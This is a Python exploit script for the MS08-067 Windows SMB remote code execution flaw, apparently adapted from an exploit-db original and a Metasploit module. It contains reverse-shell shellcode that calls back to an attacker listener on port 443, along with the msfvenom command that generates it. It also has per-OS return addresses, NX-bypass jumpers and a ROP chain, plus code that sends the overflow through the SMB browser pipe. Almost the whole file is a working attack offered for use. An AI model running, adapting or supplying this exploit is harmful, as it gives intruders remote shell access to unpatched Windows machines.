import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!

# Modified by Mark Buffalo (below 2 comments) 
# msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.162 LPORT=443  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python -v shellcode --nops 32
# Note: For this to work out of the box, ensure that your payload size is EXACTLY 380 bytes. You can use --nops # to to make it work. Example: --nops 32. 
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode += "\xd6\x92\x9b\x9b\xf5\x9f\xfc\x43\x48\x48\x37\x9b"
shellcode += "\xfc\x37\x91\x37\x92\xfd\x90\x93\xfc\x37\x92\x48"
shellcode += "\x48\x99\x27\x3f\x48\x90\x9b\x93\x29\xc9\x83\xe9"
shellcode += "\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\x22"
shellcode += "\x54\x92\xda\x83\xee\xfc\xe2\xf4\xde\xbc\x10\xda"
shellcode += "\x22\x54\xf2\x53\xc7\x65\x52\xbe\xa9\x04\xa2\x51"
shellcode += "\x70\x58\x19\x88\x36\xdf\xe0\xf2\x2d\xe3\xd8\xfc"
shellcode += "\x13\xab\x3e\xe6\x43\x28\x90\xf6\x02\x95\x5d\xd7"
shellcode += "\x23\x93\x70\x28\x70\x03\x19\x88\x32\xdf\xd8\xe6"
shellcode += "\xa9\x18\x83\xa2\xc1\x1c\x93\x0b\x73\xdf\xcb\xfa"
shellcode += "\x23\x87\x19\x93\x3a\xb7\xa8\x93\xa9\x60\x19\xdb"
shellcode += "\xf4\x65\x6d\x76\xe3\x9b\x9f\xdb\xe5\x6c\x72\xaf"
shellcode += "\xd4\x57\xef\x22\x19\x29\xb6\xaf\xc6\x0c\x19\x82"
shellcode += "\x06\x55\x41\xbc\xa9\x58\xd9\x51\x7a\x48\x93\x09"
shellcode += "\xa9\x50\x19\xdb\xf2\xdd\xd6\xfe\x06\x0f\xc9\xbb"
shellcode += "\x7b\x0e\xc3\x25\xc2\x0b\xcd\x80\xa9\x46\x79\x57"
shellcode += "\x7f\x3c\xa1\xe8\x22\x54\xfa\xad\x51\x66\xcd\x8e"
shellcode += "\x4a\x18\xe5\xfc\x25\xab\x47\x62\xb2\x55\x92\xda"
shellcode += "\x0b\x90\xc6\x8a\x4a\x7d\x12\xb1\x22\xab\x47\x8a"
shellcode += "\x72\x04\xc2\x9a\x72\x14\xc2\xb2\xc8\x5b\x4d\x3a"
shellcode += "\xdd\x81\x05\xb0\x27\x3c\x98\xd1\x22\xf6\xfa\xd8"
shellcode += "\x22\x55\x29\x53\xc4\x3e\x82\x8c\x75\x3c\x0b\x7f"
shellcode += "\x56\x35\x6d\x0f\xa7\x94\xe6\xd6\xdd\x1a\x9a\xaf"
shellcode += "\xce\x3c\x62\x6f\x80\x02\x6d\x0f\x4a\x37\xff\xbe"
shellcode += "\x22\xdd\x71\x8d\x75\x03\xa3\x2c\x48\x46\xcb\x8c"
shellcode += "\xc0\xa9\xf4\x1d\x66\x70\xae\xdb\x23\xd9\xd6\xfe"
shellcode += "\x32\x92\x92\x9e\x76\x04\xc4\x8c\x74\x12\xc4\x94"
shellcode += "\x74\x02\xc1\x8c\x4a\x2d\x5e\xe5\xa4\xab\x47\x53"
shellcode += "\xc2\x1a\xc4\x9c\xdd\x64\xfa\xd2\xa5\x49\xf2\x25"
shellcode += "\xf7\xef\x72\xc7\x08\x5e\xfa\x7c\xb7\xe9\x0f\x25"
shellcode += "\xf7\x68\x94\xa6\x28\xd4\x69\x3a\x57\x51\x29\x9d"
shellcode += "\x31\x26\xfd\xb0\x22\x07\x6d\x0f"



nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os


    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))




        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

				print '\nUsage: %s <target ip>\n' % sys.argv[0]

				print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
				print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

				sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
